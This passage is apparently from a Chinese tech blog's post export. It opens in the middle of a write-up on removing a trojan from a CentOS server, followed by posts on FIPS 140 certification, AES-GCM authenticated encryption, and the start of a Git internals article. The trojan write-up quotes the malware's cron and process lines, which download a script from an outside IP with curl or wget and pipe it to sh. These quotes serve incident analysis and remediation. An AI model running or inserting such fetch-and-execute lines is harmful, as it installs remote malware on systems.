-m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br><span class=\"line\">root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>检查cron任务</p>\n<p> 该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"该木马的工作原理\"><a href=\"#该木马的工作原理\" class=\"headerlink\" title=\"该木马的工作原理\"></a>该木马的工作原理</h2><ul>\n<li>通过网络爬虫等手段收集服务器域名信息</li>\n<li>以服务器默认的root用户，通过ssh暴力破解获得口令</li>\n<li>通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下</li>\n<li>后台启动木马，打开自定义端口进行远程控制</li>\n</ul>\n<h2 id=\"处理措施\"><a href=\"#处理措施\" class=\"headerlink\" title=\"处理措施\"></a>处理措施</h2><ul>\n<li>手工清理cron的任务清单</li>\n<li>手工杀死<code>/tmp/vThHH</code>，<code>/usr/bin/ybznfa2</code>等可疑进程</li>\n<li>手工删除上述木马程序</li>\n<li>检查系统进程、网络服务、定时任务等状态，确认问题解决</li>\n</ul>\n<h2 id=\"如何彻底解决SSH暴力破解的威胁\"><a href=\"#如何彻底解决SSH暴力破解的威胁\" class=\"headerlink\" title=\"如何彻底解决SSH暴力破解的威胁\"></a>如何彻底解决SSH暴力破解的威胁</h2><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>\n<p><em><strong>应该说，腾讯云提供的安全服务还是比较有效的，赞一个！</strong></em></p>\n<hr>\n<h2 id=\"附录1-关于lsof命令\"><a href=\"#附录1-关于lsof命令\" class=\"headerlink\" title=\"附录1: 关于lsof命令\"></a>附录1: 关于lsof命令</h2><p>查看被占用端口的归属进程，可用使用<code>lsof -i:&lt;port&gt;</code>命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># lsof -i:80</span></span><br><span class=\"line\">COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class=\"line\">nginx   936  root    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br><span class=\"line\">nginx   937 nginx    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure>\n\n<p>查看某个进程使用的系统资源信息，包括文件、端口等，可以使用<code>lsof -p &lt;pid&gt;</code> 命令。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># lsof -p 527</span></span><br><span class=\"line\">COMMAND   PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME</span><br><span class=\"line\">YDService 527 root  cwd       DIR              253,1     4096 525988 /usr/local/qcloud/YunJing/YDEyes</span><br><span class=\"line\">YDService 527 root  rtd       DIR              253,1     4096      2 /</span><br><span class=\"line\">YDService 527 root  txt       REG              253,1  5194952 525989 /usr/local/qcloud/YunJing/YDEyes/YDService</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    68192 266804 /usr/lib64/libbz2.so.1.0.6</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   157424 266780 /usr/lib64/liblzma.so.5.2.2</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    90248 265916 /usr/lib64/libz.so.1.2.7</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    99944 266803 /usr/lib64/libelf-0.170.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    19896 266044 /usr/lib64/libattr.so.1.1.0</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   297360 274746 /usr/lib64/libdw-0.170.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    20032 266047 /usr/lib64/libcap.so.2.22</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    86544 274509 /usr/lib64/libnss_myhostname.so.2</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   106848 265653 /usr/lib64/libresolv-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    31824 265641 /usr/lib64/libnss_dns-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    62184 265643 /usr/lib64/libnss_files-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1  2173512 265625 /usr/lib64/libc-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    88720 262170 /usr/lib64/libgcc_s-4.8.5-20150702.so.1</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1  1139680 265633 /usr/lib64/libm-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   995840 265950 /usr/lib64/libstdc++.so.6.0.19</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    19776 265631 /usr/lib64/libdl-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   144792 265651 /usr/lib64/libpthread-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1    44448 265655 /usr/lib64/librt-2.17.so</span><br><span class=\"line\">YDService 527 root  mem       REG              253,1   164240 265618 /usr/lib64/ld-2.17.so</span><br><span class=\"line\">YDService 527 root    0w      REG              253,1   227581 525140 /usr/local/qcloud/YunJing/log/ydservice.20190505.<span class=\"built_in\">log</span></span><br><span class=\"line\">YDService 527 root    1u      CHR                1,3      0t0   5078 /dev/null</span><br><span class=\"line\">YDService 527 root    2u  a_inode               0,10        0   5074 [eventpoll]</span><br><span class=\"line\">YDService 527 root    3uW     REG               0,19        3  13104 /run/YDService.pid</span><br><span class=\"line\">YDService 527 root    4u     IPv4              17010      0t0    TCP VM_0_17_centos:45598-&gt;169.254.0.55:lsi-bobcat (ESTABLISHED)</span><br><span class=\"line\">YDService 527 root    5u     unix 0xffff8da7babcec00      0t0  17082 /usr/local/yd.socket.server</span><br><span class=\"line\">YDService 527 root    6u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root    7r  a_inode               0,10        0   5074 inotify</span><br><span class=\"line\">YDService 527 root    8u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root    9u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   10u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   11u  a_inode               0,10        0   5074 [timerfd]</span><br><span class=\"line\">YDService 527 root   24u     unix 0xffff8da7bb51fc00      0t0  17639 /usr/local/yd.socket.server</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录2：关于crontab命令\"><a href=\"#附录2：关于crontab命令\" class=\"headerlink\" title=\"附录2：关于crontab命令\"></a>附录2：关于crontab命令</h2><ul>\n<li>crond是常用的木马启动入口，主要的配置文件存放在 <code>/var/spool/cron/</code>目录下。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># ls -l /var/spool/cron</span></span><br><span class=\"line\">总用量 4</span><br><span class=\"line\">drwxr-xr-x 2 root root 4096 4月  18 20:58 crontabs</span><br><span class=\"line\">-rw------- 1 root root    0 5月   5 11:10 root</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>也可能存放在<code>/etc/cron.d/</code>等类似目录下。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos etc]<span class=\"comment\"># ls -lF /etc |grep cron</span></span><br><span class=\"line\">-rw-------.  1 root root      541 4月  11 2018 anacrontab</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 4月  30 16:47 cron.d/</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.daily/</span><br><span class=\"line\">-rw-------.  1 root root        0 4月  11 2018 cron.deny</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.hourly/</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.monthly/</span><br><span class=\"line\">-rw-r--r--.  1 root root      451 6月  10 2014 crontab</span><br><span class=\"line\">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.weekly/</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>cron的运行日志保存在<code>/var/log/cron</code>文件中，内容格式为</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@VM_0_17_centos <span class=\"built_in\">log</span>]<span class=\"comment\"># head /var/log/cron</span></span><br><span class=\"line\"></span><br><span class=\"line\">Dec 21 09:11:35 VM_0_17_centos crontab[1627]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:35 VM_0_17_centos crontab[1626]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1698]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1702]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1701]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1728]: (root) LIST (root)</span><br><span class=\"line\">Dec 21 09:11:42 VM_0_17_centos crontab[1730]: (root) REPLACE (root)</span><br><span class=\"line\">Dec 21 09:12:02 VM_0_17_centos CROND[1811]: (root) CMD (/usr/local/qcloud/stargate/admin/start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class=\"line\">Dec 21 09:12:32 VM_0_17_centos crond[739]: (CRON) INFO (Shutting down)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><a href=\"http://www.cnblogs.com/longjshz/p/5779215.html\">crontab配置方法的参考文档</a></li>\n</ul>\n"},{"title":"FIPS 140 认证体系","url":"/2024/03/10/FIPS-140-%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>FIPS 140 是 NIST（国家标准与技术研究院，美国）制定的一项技术标准，描述了用于敏感但非保密 (SBU) 用途的 IT 产品所需满足的加密和相关安全要求。</p>\n<p>1994年发布了 FIPS 140-1，2001年发布了<a href=\"https://csrc.nist.gov/pubs/fips/140-2/upd2/final\">FIPS 140-2</a>成为业界主流标准 ，2019年正式发布了<a href=\"https://csrc.nist.gov/pubs/fips/140-3/final\">FIPS 140-3</a>，其管理方式有重大变化，不再直接定义模块要求，而是引用了 ISO&#x2F;IEC 的技术标准，其中加密模块的安全要求遵循 ISO&#x2F;IEC 19790，加密模块的测试要求遵循 ISO&#x2F;IEC 24759。</p>\n<p>2020年，CMVP 开始接受 FIPS 140-3 的验证申请，但实施过程出现严重积压，截至目前还没有任何产品获得通过，预计 FIPS 140-2 至少延期至 2026 年。</p>\n<h2 id=\"二、安全等级\"><a href=\"#二、安全等级\" class=\"headerlink\" title=\"二、安全等级\"></a>二、安全等级</h2><p>FIPS 140-2 定义了 4 个安全等级，包括：</p>\n<ul>\n<li>L1：通常用于仅软件加密产品。要求验证至少一个已批准的加密演算法或安全功能，并确保所有组件符合生产级评估要素。</li>\n<li>L2：要求提供<strong>基于角色的验证</strong>，并具有通过使用物理锁定或防篡改签章识别物理篡改的能力。</li>\n<li>L3：要求提供<strong>基于身份的认证</strong>，并提供物理篡改预防措施，防止拆卸或修改，如果检测到篡改，设备必须能够擦除关键安全参数，要求私钥只能以加密形式进入或离开等。</li>\n<li>L4：专用于缺少物理保护的环境，要求提供高级篡改保护，如果检测到各种形式的环境攻击，则擦除设备的内容。</li>\n</ul>\n<h2 id=\"三、认证体系\"><a href=\"#三、认证体系\" class=\"headerlink\" title=\"三、认证体系\"></a>三、认证体系</h2><p><a href=\"https://csrc.nist.gov/projects/cryptographic-algorithm-validation-program\">CAVP（Cryptographic Algorithm Validation Program，加密算法验证计划）</a>由 NIST 于 1995 年 7 月建立，旨在根据 FIPS&#x2F;NIST&#x2F;CSE 推荐的加密算法及算法组件展开验证测评，验证测试包括分组密码、分组密码模式、数字签名、密钥管理、信息验证、随机数列生成、安全散列等。<br>加密算法验证是加密模块验证程序(CMVP)下的 FIPS140-2 验证的先决条件。</p>\n<p><a href=\"https://csrc.nist.gov/projects/cryptographic-module-validation-program\">CMVP（Cryptographic Module Validation Program，加密模块验证计划）</a>由美国 NIST 和加拿大政府的通讯安全组织(Communications security establishment, CSE)于 1995 年共同建立，其目标是提供一份可供采购使用的 IT 安全产品列表，列表上的产品已成功通过 FIPS 140-2 标准验证。</p>\n<p>所有基于 CMVP 的评测由第三方的授权实验室展开，这些实验室被 NVLAP（National Voluntary Laboratory Accreditation Program，国家实验室自愿认可体系）授权为 CST（Cryptographic and Security Testing，密码和安全测评）实验室，对验证测试感兴趣的供应商可以选择 21 个实验室中的任何一个。</p>\n<p><img src=\"/2024/03/10/FIPS-140-%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB/FIPS140-2.jpg\" alt=\"FIPS 140-2\"></p>\n<p>美国和加拿大的法律规定，政府采购项目必须使用 FIPS 140-2 2 级验证产品，NIST 提供所有可用于商业的<a href=\"https://csrc.nist.gov/projects/cryptographic-module-validation-program\">FIPS 140-2 认证产品清单</a>。</p>\n<h2 id=\"四、简要分析\"><a href=\"#四、简要分析\" class=\"headerlink\" title=\"四、简要分析\"></a>四、简要分析</h2><p>FIPS 140 和 CC 标准是两个互补、但不同的安全标准。 FIPS 140 主要提供<strong>加密功能验证</strong>，而 CC 标准的评估范围包含了 IT 产品中更广泛的安全功能选择。 CC 标准评估可能依赖于 FIPS 140 验证来保证基本加密功能已正确实现。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.secrss.com/articles/7687\">从美国FIPS产品体系浅窥我国密码发展趋势</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"NIST.FIPS.140-2.pdf\">NIST FIPS 140-2 加密模块的安全要求，2001年</a></li>\n<li><a href=\"NIST.FIPS.140-3.pdf\">NIST FIPS 140-3 加密模块的安全要求，2019年</a></li>\n</ul>\n"},{"title":"GCM（Galois/Counter Mode）认证加密模式","url":"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/","content":"<h2 id=\"一、背景\"><a href=\"#一、背景\" class=\"headerlink\" title=\"一、背景\"></a>一、背景</h2><p>研究分组密码工作模式的核心是<strong>机密性保护（Confidentiality）</strong>，历史上曾经将<strong>完整性保护（Integrity</strong>，例如在某些数据被修改后的情况下密码的误差传播特性）也一并纳入设计目标，但在发现兼顾两个设计目标的难度之后，密码学社区已经普遍将完整性保护作为另一个完全不同的，与加密无关的密码学目标，并开始研究专门的认证加密模式（AE，Authenticated Encryption）。</p>\n<p>在密码学中，消息验证码（MAC，Message Authentication Code，也称为标签Tag）是用于验证消息的一小段信息。换句话说，用于确认消息来自指定的发送者（其真实性）并且没有被篡改了。<br>一般情况下，消息认证码由三种算法组成：</p>\n<ul>\n<li>密钥生成算法：从密钥空间中随机均匀地选择一个密钥。</li>\n<li>签名算法：有效地返回给定密钥和消息的标签。</li>\n<li>验证算法：有效地验证给定密钥和标签的消息的真实性。 也就是说，当消息和标签没有被篡改或伪造时，返回被接受，否则返回被拒绝。</li>\n</ul>\n<p>针对消息验证码，NIST 先后提出了 HMAC，CMAC 和 GMAC。<br>2002年，HMAC 通过认证为<a href=\"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.198-1.pdf\">NIST FIPS 198-1</a>，基于单向散列函数实现，可以检查消息的完整性，但无法确保来源的可靠性。其中 ipad 是 0x36 的重复值，opad 是 0x5c 的重复值。<br><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/HMAC.png\" alt=\"HMAC\"></p>\n<p>2005年，CMAC 标准化为<a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-38b.pdf\">NIST SP800-38B</a>，基于分组密码实现，基于共享密钥派生出两个中间密钥，并进行两次哈希计算得到。<br><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/CMAC.png\" alt=\"CMAC\"><br>$L &#x3D; CIPH_k(0^b)；K_1 &#x3D; L \\otimes \\alpha；K_2 &#x3D; L \\otimes \\alpha^2；128位的生成元&#x3D;x^7+x^2+x+1$</p>\n<p>2007年，GMAC 标准化为<a href=\"nistspecialpublication800-38d.pdf\">NIST SP800-38D</a>，基于伽罗华域乘法实现，可以看做对称加密算法和消息认证码的结合。</p>\n<h2 id=\"二、基本流程\"><a href=\"#二、基本流程\" class=\"headerlink\" title=\"二、基本流程\"></a>二、基本流程</h2><p>GCM（Galois&#x2F;Counter Mode）是一种基于对称加密算法的认证加密（Authenticated Encryption）模式，用于确保数据的机密性和完整性。GCM 结合了 CTR（Counter）模式用于加密和 GHASH（Galois Hash）用于认证，因此不仅继承了 CTR 模式优秀的并行计算能力，还能额外提供对消息完整性、真实性的验证能力，因此广泛应用于 TLS、IPsec 等安全协议中。</p>\n<p>根据<a href=\"nistspecialpublication800-38d.pdf\">NIST SP800-38D</a>的定义，其认证加密过程分为三个阶段：</p>\n<ol>\n<li><strong>初始化阶段</strong>：<br> 根据给定的密钥（key）和初始向量（IV）生成一个初始计数器 ICB；<br> 计算计数器的初始值J0，当 IV 长度为96位时，J0 &#x3D; IV || 0^31 || 1。</li>\n<li><strong>加密阶段</strong>：<br> 使用 GCTR（Galois Counter）模式对明文进行加密，通过将计数器块（CB）与密钥（key）进行加密，然后将结果与明文异或，生成密文。<br> 计数器每次递增，直至加密整个明文。这里，CB 的初始值是 J0 的递增值（即 J0 + 1）。</li>\n<li><strong>认证阶段</strong>：<br> 首先，使用密钥（key）计算一个值H（称为GHASH_H），用于 GHASH 运算。<br> 接着，将关联数据AD 和密文一起输入到 GHASH 算法中，生成一个认证标签。</li>\n</ol>\n<p><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/GCM.png\" alt=\"GCM\"></p>\n<p>解密过程与加密过程类似，首先使用 GHASH 验证密文的认证标签。如果认证通过，再使用 GCTR 模式解密密文，还原成明文。</p>\n<h2 id=\"三、核心算法\"><a href=\"#三、核心算法\" class=\"headerlink\" title=\"三、核心算法\"></a>三、核心算法</h2><h3 id=\"1-有限域乘法运算-Z-X-otimes-Y\"><a href=\"#1-有限域乘法运算-Z-X-otimes-Y\" class=\"headerlink\" title=\"1. 有限域乘法运算 $Z&#x3D;X \\otimes Y$\"></a>1. 有限域乘法运算 $Z&#x3D;X \\otimes Y$</h3><p>基于有限域$GF(2^{128})$，定义本原多项式&#x3D;$x^{128}+x^7+x^2+1$。<br>处理逻辑：略。</p>\n<h3 id=\"2-带密钥的哈希值计算-Y-GHASH-H-X\"><a href=\"#2-带密钥的哈希值计算-Y-GHASH-H-X\" class=\"headerlink\" title=\"2. 带密钥的哈希值计算 $Y&#x3D;GHASH_H(X)$\"></a>2. 带密钥的哈希值计算 $Y&#x3D;GHASH_H(X)$</h3><p>先决条件：哈希算法的子密钥$H$<br>输入参数：128位比特流$X$<br>输出结果：分组$Y$<br>核心逻辑：</p>\n<p>$Y&#x3D;(X_1 \\otimes H^m) \\oplus (X_2 \\otimes H^{m-1}) \\oplus … \\oplus (X_{m-1} \\otimes H^2) \\oplus (X_m \\otimes H) $</p>\n<blockquote>\n<p>类似二项式乘法：将输入分组切割，并作为密钥 H 各阶的系数，与 CBC 的链式特征很相似</p>\n</blockquote>\n<p><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/ghash.png\" alt=\"GHASH\"></p>\n<h3 id=\"3-计数器操作-Y-GCTR-K-ICB-X\"><a href=\"#3-计数器操作-Y-GCTR-K-ICB-X\" class=\"headerlink\" title=\"3. 计数器操作 $Y&#x3D;GCTR_K(ICB,X)$\"></a>3. 计数器操作 $Y&#x3D;GCTR_K(ICB,X)$</h3><p>先决条件：底层的128位分组密码算法$CIPH$<br>输入参数：128位比特流$X$<br>输出结果：分组$Y$<br>核心逻辑：</p>\n<ol>\n<li>初始计数器块ICB（Initial Counter Block），构造方式为：96位 IV + 31位0 + 1，<br>$J_0 &#x3D; IV \\parallel 0^{31} \\parallel 1$</li>\n<li>计数器递增<br> $CB_1&#x3D;ICB$<br> $CB_i&#x3D;inc_{32}(CB_{i-1})$</li>\n<li>根据流密钥进行加密或解密<br> $Y_i&#x3D; X_i \\oplus CIPH_k(CB_i)$</li>\n</ol>\n<p><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/gctr.png\" alt=\"GCTR\"></p>\n<h3 id=\"4-认证加密算法-C-T-GCM-AE-K-IV-P-A\"><a href=\"#4-认证加密算法-C-T-GCM-AE-K-IV-P-A\" class=\"headerlink\" title=\"4. 认证加密算法 $(C,T)&#x3D;GCM-AE_K(IV,P,A)$\"></a>4. 认证加密算法 $(C,T)&#x3D;GCM-AE_K(IV,P,A)$</h3><p>先决条件：底层的128位分组密码算法$CIPH$；密钥$K$；标签长度$t$<br>输入参数：初始化向量$IV$；明文$P$；附加认证数据$A$<br>输出结果：密文$C$；标签$T$<br>核心逻辑：</p>\n<ol>\n<li>调用 GCTR 生成密文C<br> $C &#x3D; GCTR_k(inc_{32}(J_0),P)$</li>\n<li>构造验证数据块S，关键数据是 A 和C，还有一些填充位<br> $u &#x3D; len(C) \\ mod\\ 128;\\ v &#x3D; len(A) \\ mod\\ 128$<br> $S &#x3D; GHASH_H(A \\parallel 0^v \\parallel C \\parallel 0^u \\parallel [len(A)]_{64} \\parallel [len(C)]_{64})$</li>\n<li>计算数据块S的哈希值，并存入tag<br> $T &#x3D; MSB_i(GCTR_k(J_0,S))$</li>\n</ol>\n<p><img src=\"/2023/12/02/GCM%EF%BC%88Galois-Counter-Mode%EF%BC%89%E8%AE%A4%E8%AF%81%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/arch.png\" alt=\"arch\"></p>\n<h3 id=\"5-认证解密算法-P-GCM-AD-K-IV-C-A，T\"><a href=\"#5-认证解密算法-P-GCM-AD-K-IV-C-A，T\" class=\"headerlink\" title=\"5. 认证解密算法 $P&#x3D;GCM-AD_K(IV,C,A，T)$\"></a>5. 认证解密算法 $P&#x3D;GCM-AD_K(IV,C,A，T)$</h3><p>先决条件：底层的128位分组密码算法$CIPH$；密钥$K$；标签长度$t$<br>输入参数：初始化向量$IV$；密文$C$；附加认证数据$A$；标签$T$<br>输出结果：明文$P$，或者 FAIL<br>核心逻辑：</p>\n<ol>\n<li>调用 GCTR 生成明文P<br> $P &#x3D; GCTR_k(inc_{32}(J_0),C)$</li>\n<li>构造验证数据块S，关键数据是 A 和C，还有一些填充位<br> $u &#x3D; len(C) \\ mod\\ 128;\\ v &#x3D; len(A) \\ mod\\ 128$<br> $S &#x3D; GHASH_H(A \\parallel 0^v \\parallel C \\parallel 0^u \\parallel [len(A)]_{64} \\parallel [len(C)]_{64})$</li>\n<li>计算数据块S的哈希值，并存入$T’$<br> $T’ &#x3D; MSB_i(GCTR_k(J_0,S))$</li>\n<li>如果$T &#x3D; T’$，验证通过返回明文P；否则返回 FAIL</li>\n</ol>\n<h2 id=\"四、技术分析\"><a href=\"#四、技术分析\" class=\"headerlink\" title=\"四、技术分析\"></a>四、技术分析</h2><h3 id=\"1-安全性要求\"><a href=\"#1-安全性要求\" class=\"headerlink\" title=\"1. 安全性要求\"></a>1. 安全性要求</h3><p>GCM 在具体的安全模型中被证明是机密性安全，但需要同时满足三个前提条件：</p>\n<ul>\n<li>$len(P) &lt;&#x3D; 2^{39} - 256$</li>\n<li>$len(A) &lt;&#x3D; 2^{64} -1$</li>\n<li>$1 &lt;&#x3D; len(IV) &lt;&#x3D; 2^{64}-1$</li>\n</ul>\n<p>对于任何给定的密钥和初始化向量组合，GCM 加密数据 P 的长度不得高于大约 64 GB。<br>附加身份验证数据 AAD（Additional Authenticated Data）是不需要加密但需要认证的数据，以明文形式与密文一起传递给接收者，通常包含源IP，源端口，目的IP，IV等信息。<br>IV 通常为 96 位长度。</p>\n<p>身份验证的安全性取决于 MAC 的长度。一般来说，标签长度 t 应该在[128，120，112，104，96]中选择。对于某些应用，t 可能是 64 或 32，但必须限制输入的长度数据和密钥的生命周期。</p>\n<h3 id=\"2-硬件加速\"><a href=\"#2-硬件加速\" class=\"headerlink\" title=\"2. 硬件加速\"></a>2. 硬件加速</h3><p>GCM 要求对每个加密和验证数据块（128 位）在有限域中进行一次分组密码操作和一次 128 位乘法。分组密码操作很容易流水线化或并行化；乘法运算也很容易流水线化，并且可以通过一些适度的努力进行并行化。</p>\n<p>Intel 添加了<code>PCLMULQDQ</code>指令，突出了它对 GCM 的使用。<br>2011 年，SPARC 添加了<code>XMULX</code>和<code>XMULXHI</code>指令，它们也执行 64 × 64 位无进位乘法。<br>2015 年，SPARC 添加了<code>XMPMUL</code>指令，该指令对更大的值执行 XOR 乘法，高达 2048 × 2048 位的输入值产生 4096 位的结果。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"nistspecialpublication800-38d.pdf\">NIST SP800-38D</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Galois&#x2F;Counter Mode - WiKi</a></li>\n<li><a href=\"https://blog.csdn.net/Chahot/article/details/130407149\">GCM与CCM的的规格和加解密过程</a></li>\n<li><a href=\"https://const.net.cn/tool/aes/aes-gcm/\">aes-gcm 在线加密工具</a></li>\n<li><a href=\"https://github.com/openluopworld/aes_gcm/blob/master/gcm.c\">GCM 的C语言代码示例</a></li>\n</ul>\n"},{"title":"Git 技术原理分析","url":"/2024/12/31/Git-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","content":"<p><a href=\"https://git-scm.com/\">Git</a>是一款开源的<strong>分布式</strong>版本控制系统，以其分布式架构、轻量级分支、强大的协作能力而闻名。</p>\n<ul>\n<li>不同于传统的基于差异的版本控制系统，Git 保存文件系统的完整快照，并在文件未修改时仅保留链接，提高了效率。其本地执行操作的特性使得大部分操作无需联网即可完成，例如浏览项目历史和对比版本差异，这对于离线环境下的工作非常便捷。</li>\n<li>Git 的数据完整性由 SHA-1 校验和保证，可以及时发现数据传输过程中的丢失或损坏。此外，Git 仅执行添加数据的操作，确保提交后的数据难以丢失。</li>\n<li>Git 的核心是一个键值对数据库，通过唯一的键值可以随时取回数据。它使用三种对象类型：数据对象（blob）存储文件内容，树对象（tree）组织文件，提交对象（commit）保存快照信息，包括指向树对象的指针、作者信息、提交信息和父对象指针。</li>\n<li>Git 的分支是指向提交对象的可变指针，默认分支为 Master。创建分支实际上是在提交对象上创建一个新的指针。HEAD 指针指向当前所在的本地分支。通过 <code>git checkout</code> 命令可以在不同分支之间切换，并最终合并它们。</li>\n</ul>\n<p>Git 常用命令如下，全部命令的中文资料参见<a href=\"https://git-scm.com/book/zh/v2\">https://git-scm.com/book/zh/v2</a>。</p>\n<p><img src=\"/2024/12/31/Git-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/commands.jpg\" alt=\"command\"></p>\n<p>下面设置一个代码库，实际看看其如何实现的。</p>\n<p><img src=\"/2024/12/31/Git-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/pic01.png\" alt=\"pic01\"></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">(base) sj@SunJiandeMacBook-Air testgit % tree -a</span><br><span class=\"line\">.</span><br><span class=\"line\">├── .git</span><br><span class=\"line\">│   ├── COMMIT_EDITMSG</span><br><span class=\"line\">│   ├── HEAD</span><br><span class=\"line\">│   ├── config</span><br><span class=\"line\">│   ├── description</span><br><span class=\"line\">│   ├── hooks</span><br><span class=\"line\">│   │   ├── applypatch-msg.sample</span><br><span class=\"line\">│   │   ├── commit-msg.sample</span><br><span class=\"line\">│   │   ├── fsmonitor-watchman.sample</span><br><span class=\"line\">│   │   ├── post-update.sample</span><br><span class=\"line\">│   │   ├── 